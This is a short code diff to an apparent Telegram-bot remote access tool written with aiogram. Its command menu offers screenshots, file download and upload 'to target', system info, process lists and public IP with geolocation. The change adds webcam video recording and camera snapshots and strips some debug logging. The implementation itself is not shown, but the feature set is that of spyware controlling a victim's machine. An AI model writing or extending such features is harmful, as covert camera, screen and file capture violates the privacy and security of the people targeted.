@@ -2,7 +2,6 @@ from aiogram import Router
 from aiogram.types import Message
 from aiogram.filters.command import Command
 import logging
-from icecream import ic
 
 router: Router = Router()
 
@@ -13,8 +12,10 @@ commands = '''
 /sc - screenshot
 /download - download (abs. path)
 /info - system info
-/ip - public ip address
+/ip - public ip address and geolocation
 /ps - process list
+/webcam 5 - record video (secs)
+/webcam - screenshot from camera
 Send any file as file for upload to target'''
 
 
@@ -25,8 +26,6 @@ async def cmd_start(message: Message):
         await message.answer(f'{commands}')
         await message.answer(f'Author: @pt_soft')
     except Exception as e:
-        ic()
-        ic(e)
         logging.error(e)
 
 
